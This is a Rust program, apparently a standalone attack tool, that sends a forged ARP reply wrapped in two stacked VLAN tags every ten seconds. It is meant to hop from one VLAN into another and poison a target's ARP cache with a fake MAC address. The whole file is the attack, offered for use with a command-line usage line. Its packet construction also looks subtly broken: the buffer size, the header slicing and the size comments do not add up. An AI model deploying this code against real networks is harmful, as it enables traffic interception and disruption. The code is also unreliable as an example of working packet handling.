
use std::env;
use std::thread;
use std::time::Duration;
use pnet::packet::ethernet::{MutableEthernetPacket, EtherTypes};
use pnet::packet::vlan::{MutableVlanPacket, MutableVlanHeader};
use pnet::packet::arp::{ArpPacket, MutableArpPacket};
use pnet::datalink::{self, NetworkInterface};
use pnet::util::MacAddr;
use pnet::datalink::Channel::Ethernet;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 7 {
        eprintln!("Usage: {} <interface_name> <our_vlan> <target_vlan> <fake_ip> <target_ip> <fake_mac>", args[0]);
        return;
    }

    let iface_name = &args[1];
    let our_vlan: u16 = args[2].parse().unwrap();
    let target_vlan: u16 = args[3].parse().unwrap();
    let fake_ip = &args[4];
    let target_ip = &args[5];
    let fake_mac_parts: Vec<u8> = args[6].split(':').map(|part| u8::from_str_radix(part, 16).unwrap()).collect();
    let fake_mac = MacAddr::new(fake_mac_parts[0], fake_mac_parts[1], fake_mac_parts[2], fake_mac_parts[3], fake_mac_parts[4], fake_mac_parts[5]);

    let interface_names_match = |iface: &NetworkInterface| iface.name == *iface_name;
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter().filter(interface_names_match).next().unwrap();

    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unsupported channel type"),
        Err(e) => panic!("Error creating datalink channel: {}", e),
    };

    loop {
        let mut buffer = [0u8; 42]; // Ethernet header (14) + 2 VLAN headers (8 + 4) + ARP packet (16)
        let mut ethernet_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
        ethernet_packet.set_ethertype(EtherTypes::Vlan);
        
        let mut vlan_header1 = MutableVlanHeader::new(&mut ethernet_packet.payload_mut()[..4]).unwrap();
        vlan_header1.set_priority(0);
        vlan_header1.set_cfi(0);
        vlan_header1.set_id(our_vlan);
        vlan_header1.set_ethertype(EtherTypes::Vlan);
        
        let mut vlan_header2 = MutableVlanHeader::new(&mut vlan_header1.payload_mut()[..4]).unwrap();
        vlan_header2.set_priority(0);
        vlan_header2.set_cfi(0);
        vlan_header2.set_id(target_vlan);
        vlan_header2.set_ethertype(EtherTypes::Arp);
        
        let mut arp_packet = MutableArpPacket::new(&mut vlan_header2.payload_mut()[..]).unwrap();
        arp_packet.set_hw_type(1); // Ethernet
        arp_packet.set_proto_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(2); // Reply
        
        arp_packet.set_sender_hw_addr(fake_mac);
        arp_packet.set_sender_proto_addr(fake_ip.parse().unwrap());
        arp_packet.set_target_hw_addr(MacAddr::zero());
        arp_packet.set_target_proto_addr(target_ip.parse().unwrap());

        tx.send_to(ethernet_packet.packet(), None).unwrap();
        thread::sleep(Duration::from_secs(10));
    }
}
